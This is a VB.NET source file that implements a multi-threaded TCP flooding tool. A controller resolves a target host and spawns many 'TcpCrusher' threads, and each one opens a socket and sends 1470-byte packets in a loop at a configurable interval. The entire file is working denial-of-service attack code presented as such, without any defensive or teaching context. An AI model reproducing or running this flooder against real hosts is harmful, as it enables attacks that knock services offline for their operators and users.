Imports System
Imports System.Net
Imports System.Threading
Imports System.Collections.Generic
Imports System.Net.Sockets

Public Class TcpController
    Public Shared isFlooding As Boolean = False

    Shared targetList As New List(Of TcpCrusher)()

    Public Sub AddTarget(ByVal host As String, ByVal interval As Integer, ByVal usedThreads As Integer)
        AddTarget(host, 200, interval, usedThreads)
    End Sub

    Private Function ParseHost(ByVal host As String) As String
        Dim addresslist As IPAddress() = Dns.GetHostAddresses(host)
        Dim parsedIP As String = ""

        For Each theaddress As IPAddress In addresslist
            parsedIP = theaddress.ToString()
        Next

        Return parsedIP
    End Function

    Public Sub AddTarget(ByVal host As String, ByVal port As Integer, ByVal interval As Integer, ByVal usedThreads As Integer)
        Dim parsedHost As String = ParseHost(host)
        If [String].IsNullOrEmpty(parsedHost) Then
            Throw New HostNotFoundException("")
        End If

        Dim hostEP As New IPEndPoint(IPAddress.Parse(parsedHost), port)

        For i As Integer = 0 To usedThreads
            targetList.Add(New TcpCrusher(hostEP, interval))
        Next
    End Sub


    Public Sub Start()
        For Each flood As TcpCrusher In targetList
            flood.StartFlood()
        Next
    End Sub


    Public Shared Sub [Stop]()
        For Each flood As TcpCrusher In targetList
            flood.StopFlood()
        Next
        Clear()
    End Sub


    Public Shared Sub Clear()
        For Each flood As TcpCrusher In targetList
            flood.Abort()
        Next

        targetList.Clear()
    End Sub


    Public Class TcpCrusher
        Private t As Thread
        Private flood As TcpFlood

        Public Sub New(ByVal host As IPEndPoint, ByVal interval As Integer)
            flood = New TcpFlood(host, interval)
            t = New Thread(AddressOf flood.StartFlood)
            t.Start()
        End Sub

        Public Sub StartFlood()
            flood.IsFlooding = True
            isFlooding = True
            flood.StartFlood()
        End Sub

        Public Sub StopFlood()
            flood.StopFlood()
        End Sub

        Public Sub Abort()
            Try
                flood.StopFlood()
                flood.IsFlooding = False
                t.Abort()
            Catch
            End Try
        End Sub

        Public Class TcpFlood
            Private client As Socket
            Private _host As IPEndPoint = Nothing
            Private _interval As Integer

            Private _IsFlooding As Boolean
            Public Property IsFlooding() As Boolean
                Get
                    Return _IsFlooding
                End Get
                Set(ByVal value As Boolean)
                    _IsFlooding = value
                End Set
            End Property

            Public Sub New(ByVal host As IPEndPoint, ByVal interval As Integer)
                _host = host
                _interval = interval
                client = New Socket(_host.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
            End Sub

            Public Sub StartFlood()
                If Not client.Connected Then
                    client.Connect(_host)
                End If
                IsFlooding = True
                IsFlooding = True
                Flood()
            End Sub

            Public Sub StopFlood()
                If client.Connected Then
                    client.Close()
                End If
                IsFlooding = False
                IsFlooding = False
            End Sub

            Private Sub Flood()
                While IsFlooding
                    Dim packet As Byte() = New Byte(1469) {}
                    Try
                        client.SendTo(packet, _host)
                    Catch
                    Finally
                        Thread.Sleep(_interval)
                    End Try
                End While
            End Sub
        End Class
    End Class
End Class

<Serializable()> _
Public Class HostNotFoundException
    Inherits Exception
    Public Sub New()
    End Sub
    Public Sub New(ByVal message As String)
        MyBase.New(message)
    End Sub
    Public Sub New(ByVal message As String, ByVal inner As Exception)
        MyBase.New(message, inner)
    End Sub
    Protected Sub New(ByVal info As System.Runtime.Serialization.SerializationInfo, ByVal context As System.Runtime.Serialization.StreamingContext)
        MyBase.New(info, context)
    End Sub
End Class


